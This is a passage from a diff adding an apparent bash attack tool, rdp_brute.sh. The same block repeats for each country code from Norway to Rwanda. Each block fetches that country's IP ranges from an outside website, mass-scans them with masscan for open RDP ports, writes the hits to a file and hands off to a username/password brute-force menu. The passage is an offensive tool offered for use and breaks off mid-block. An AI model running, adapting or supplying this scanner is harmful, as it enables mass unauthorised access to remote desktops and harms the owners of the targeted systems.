+curl http://ipdiapazon.16mb.com/Norway.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "141" ]; then
+curl http://ipdiapazon.16mb.com/Oman.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "142" ]; then
+curl http://ipdiapazon.16mb.com/Pakistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "143" ]; then
+curl http://ipdiapazon.16mb.com/Palau.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "144" ]; then
+curl http://ipdiapazon.16mb.com/Palestinian.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "145" ]; then
+curl http://ipdiapazon.16mb.com/Panama.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "146" ]; then
+curl http://ipdiapazon.16mb.com/Papua_new_guinea.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "147" ]; then
+curl http://ipdiapazon.16mb.com/Paraguay.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "148" ]; then
+curl http://ipdiapazon.16mb.com/Peru.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "149" ]; then
+curl http://ipdiapazon.16mb.com/Philippines.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "150" ]; then
+curl http://ipdiapazon.16mb.com/Poland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "151" ]; then
+curl http://ipdiapazon.16mb.com/Portugal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "152" ]; then
+curl http://ipdiapazon.16mb.com/Puerto_rico.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "153" ]; then
+curl http://ipdiapazon.16mb.com/Qatar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "154" ]; then
+curl http://ipdiapazon.16mb.com/Romania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "155" ]; then
+curl http://ipdiapazon.16mb.com/Russia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g" |sed '$d'>list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "156" ]; then
+curl http://ipdiapazon.16mb.com/Rwanda.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
